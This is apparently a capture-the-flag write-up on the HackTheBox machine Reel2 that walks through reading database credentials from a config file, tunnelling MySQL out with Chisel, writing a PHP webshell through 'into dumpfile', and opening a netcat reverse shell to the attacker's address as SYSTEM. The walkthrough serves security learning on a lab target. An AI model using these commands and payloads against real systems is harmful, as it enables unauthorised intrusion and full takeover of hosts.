# Reel2: Root Shell

[hackthebox](/tags#hackthebox ) [ctf](/tags#ctf ) [htb-reel2](/tags#htb-reel2
) [htb-reel](/tags#htb-reel ) [nmap](/tags#nmap ) [wallstant](/tags#wallstant
) [apache](/tags#apache ) [xampp](/tags#xampp ) [mysql](/tags#mysql )
[webshell](/tags#webshell ) [chisel](/tags#chisel )  
  
Mar 15, 2021

  * [Reel2](/2021/03/13/htb-reel2.html)
  * Root Shell

![cascade](https://0xdfimages.gitlab.io/img/reel2-more-cover.png)

Both YB1 and JKR suggested a neat method for getting a shell on Reel2 that
involves abusing the Apache Web server running as SYSTEM to write a webshell.
It’s a neat path that involves identifying where the config files are and
getting access to the database using the arbitrary read intended to get the
root flag.

## Enumeration

### Webservers

#### nmap

`nmap` shows multiple HTTP(S) servers, both IIS and Apache httpd:

    
    
    oxdf@parrot$ nmap -p 80,443,8080 -sCV 10.10.10.210
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 21:42 EDT
    Nmap scan report for 10.10.10.210
    Host is up (0.018s latency).
    
    PORT     STATE SERVICE    VERSION
    80/tcp   open  http       Microsoft IIS httpd 8.5
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: 403 - Forbidden: Access is denied.
    443/tcp  open  ssl/https?
    | ssl-cert: Subject: commonName=Reel2
    | Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local
    | Not valid before: 2020-07-30T10:12:46
    |_Not valid after:  2025-07-30T10:12:46
    |_ssl-date: 2021-03-15T01:46:03+00:00; +2m39s from scanner time.
    8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
    |_http-title: Welcome | Wallstant
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    |_clock-skew: 2m38s
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 78.74 seconds
    

The TCP 8080 instance if from httpd, and that’s the Wallstant social media
page.

#### Directories

In the filesystem root there’s both a `inetpub` (IIS default location) and
`xampp` (XAMPP stack for Apache/MySQL):

    
    
    PS C:\> ls
    
    
        Directory: C:\
    
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-----        7/30/2020  12:15 PM                ExchangeSetupLogs
    d-----        7/30/2020  12:02 PM                inetpub
    d-----        8/22/2013   5:52 PM                PerfLogs
    d-r---        2/18/2021   1:16 PM                Program Files
    d-----        2/12/2021   2:49 PM                Program Files (x86)
    d-r---        7/30/2020   1:17 PM                Users
    d-----        2/12/2021   3:09 PM                Windows
    d-----        7/28/2020   2:57 PM                xampp
    

I can’t access anything in either of these directories as k.svensson:

    
    
    PS C:\inetpub> ls
    ls : Access to the path 'C:\inetpub' is denied.
    At line:1 char:1
    + ls
    + ~~
        + CategoryInfo          : PermissionDenied: (C:\inetpub:String) [Get-ChildItem], UnauthorizedAccessException
        + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    
    PS C:\xampp> ls
    ls : Access to the path 'C:\xampp' is denied.
    At line:1 char:1
    + ls
    + ~~
        + CategoryInfo          : PermissionDenied: (C:\xampp:String) [Get-ChildItem], UnauthorizedAccessException
        + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
    

#### Process List

I tried a bunch of way to get the process list as well, but still no
permissions. `tasklist` and `tasklist /v` don’t show the owning processes.
`Get-Process` has a `-IncludeUserName` flag, but I don’t have permissions:

    
    
    PS C:\xampp> Get-Process -IncludeUserName
    Get-Process : The 'IncludeUserName' parameter requires elevated user rights. Try running the command again in a 
    session that has been opened with elevated user rights (that is, Run as Administrator).
    At line:1 char:1
    + Get-Process -IncludeUserName
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : InvalidOperation: (:) [Get-Process], InvalidOperationException
        + FullyQualifiedErrorId : IncludeUserNameRequiresElevation,Microsoft.PowerShell.Commands.GetProcessCommand
    

I failed as well with `wmic` commands.

#### Assumption

At this point, it’s unclear which user is running the web process, but it’s
likely one that has some kind of privilege, and it’s not unreasonable to guess
that it’s running as SYSTEM.

### Database

IIS would typically use MSSQL (TCP 1433), and I’d expect XAMPP to install
MySQL (TCP 3306). `netstat -ano` didn’t show 1433, but did show a likely MySQL
service:

    
    
      TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       2352
    

## DB Access

### Find DB Creds

#### Find Server Root

While my shell can’t access the Apache configurations, I rooted the box via
arbitrary read in the `Check-File` command through the jea_test_account shell.
Some Googling shows that the config file for `httpd` is at
`C:\xampp\apache\conf\httpd.conf.` This shell doesn’t have access to `select-
string` to filter the results, so I’ll have to search though my shell to find
what I’m looking for amongst a lot of output:

    
    
    [10.10.10.210]: PS>Check-File C:\Programdata\..\xampp\apache\conf\httpd.conf
    #
    # This is the main Apache HTTP server configuration file.  It contains the
    # configuration directives that give the server its instructions.
    # See <URL:http://httpd.apache.org/docs/2.4/> for detailed information.
    # In particular, see
    # <URL:http://httpd.apache.org/docs/2.4/mod/directives.html>
    # for a discussion of each configuration di
    ...[snip]...
    DocumentRoot "/xampp/htdocs/social"
    <Directory "/xampp/htdocs/social">
        Options Indexes FollowSymLinks Includes ExecCGI
        AllowOverride All
        Require all granted
    </Directory> 
    ...[snip]...
    

For sanity, I confirmed that `index.php` exists at
`C:\xampp\htdocs\social\index.php`.

Alternatively, YB1 pointed out to me that there was a crash in the website
that shows this same info. Start typing a search, and then it drops down three
options:

![image-20210315071527182](https://0xdfimages.gitlab.io/img/image-20210315071527182.png)

Selecting “Search more about” will lead to a crash that includes the path:

![image-20210315071550467](https://0xdfimages.gitlab.io/img/image-20210315071550467.png)

#### Find Wallstant Config

Because Wallstant is open-source, I can go to GitHub and look around the code
for where the database credentials are stored. I’ll find them in
[here](https://github.com/nilsonlinux/wallstant-the-open-source-PHP-social-
network/blob/master/config/connect.php), in `config/connect.php`:

![image-20210315071154087](https://0xdfimages.gitlab.io/img/image-20210315071154087.png)

On Reel2, I can get that same file:

    
    
    [10.10.10.210]: PS>Check-File C:\Programdata\..\xampp\htdocs\social\config\connect.php
    <?php                   
    $servername = "localhost";                                         
    $username = "root";                                                
    $password = "Gregswd123FAEytjty"; 
    $dbname = "wallstant";
    ...[snip]...
    

### Connecting to DB

As I didn’t have access to 3306 in my original `nmap` scan but it is listening
according to the `netstat`, the firewall must be blocking access. Back in my
full shell as k.svensson, I’ll upload
[Chisel](https://github.com/jpillora/chisel) (see my [post on
Chisel](/2020/08/10/tunneling-with-chisel-and-ssf-update.html) for more
details):

    
    
    PS C:\programdata> iwr http://10.10.14.10/chisel_1.7.6_windows_amd64 -outfile c.exe
    

I’ll start the server, and then run the client from Reel2:

    
    
    PS C:\programdata> .\c.exe client 10.10.14.10:8000 R:3306:localhost:3306
    .\c.exe client 10.10.14.10:8000 R:3306:localhost:3306
    2021/03/15 12:26:07 client: Connecting to ws://10.10.14.10:8000
    2021/03/15 12:26:07 client: Connected (Latency 20.4784ms)
    

At the server the connection shows up:

    
    
    oxdf@parrot$ ./chisel_1.7.6_linux_amd64 server -p 8000 --reverse
    2021/03/15 07:23:21 server: Reverse tunnelling enabled
    2021/03/15 07:23:21 server: Fingerprint FHyXk/mKppuP4EyXIzlk5cCI/H4TQOELm7IpiriOTes=
    2021/03/15 07:23:21 server: Listening on http://0.0.0.0:8000
    2021/03/15 07:23:28 server: session#1: tun: proxy#R:3306=>localhost:3306: Listening
    

Now I can connect with the creds from the config to 127.0.0.1:3306 (`apt
install mariadb-client` on Parrot to get the `mysql` client):

    
    
    oxdf@parrot$ mysql -h 127.0.0.1 -u root -pGregswd123FAEytjty wallstant
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A
    
    Welcome to the MariaDB monitor.  Commands end with ; or \g.
    Your MariaDB connection id is 885
    Server version: 10.4.13-MariaDB mariadb.org binary distribution
    
    Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
    
    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
    
    MariaDB [wallstant]>
    

### Webshell

I’ll use that database access to write a webshell. Create a table:

    
    
    MariaDB [wallstant]> create table df(stuff text);
    Query OK, 0 rows affected (0.126 sec) 
    

Write webshell into table:

    
    
    MariaDB [wallstant]> insert into df values('<?php system($_REQUEST["cmd"]); ?>');
    Query OK, 1 row affected (0.105 sec)  
    

Output that table to a file:

    
    
    MariaDB [wallstant]> select * from df into dumpfile 'C:\\xampp\\htdocs\\social\\0xdf.php';
    Query OK, 1 row affected, 1 warning (0.121 sec)
    

It worked:

    
    
    oxdf@parrot$ curl -s "http://10.10.10.210:8080/0xdf.php?cmd=whoami"
    nt authority\system
    

### Shell

I could get that to a full shell by uploading `nc64.exe`, or using a
PowerShell reverse shell. I actually already had `nc64.exe` on Reel2 from some
testing I was doing, so triggering it to get a reverse shell is easy:

    
    
    oxdf@parrot$ curl -s "http://10.10.10.210:8080/0xdf.php" --data-urlencode "cmd=\programdata\nc64.exe -e powershell 10.10.14.10 443"
    

At a local `nc`:

    
    
    oxdf@parrot$ sudo nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.10] from (UNKNOWN) [10.10.10.210] 45095
    Windows PowerShell 
    Copyright (C) 2016 Microsoft Corporation. All rights reserved.
    
    PS C:\xampp\htdocs\social> whoami
    nt authority\system
    

[](/2021/03/15/reel2-root-shell.html)

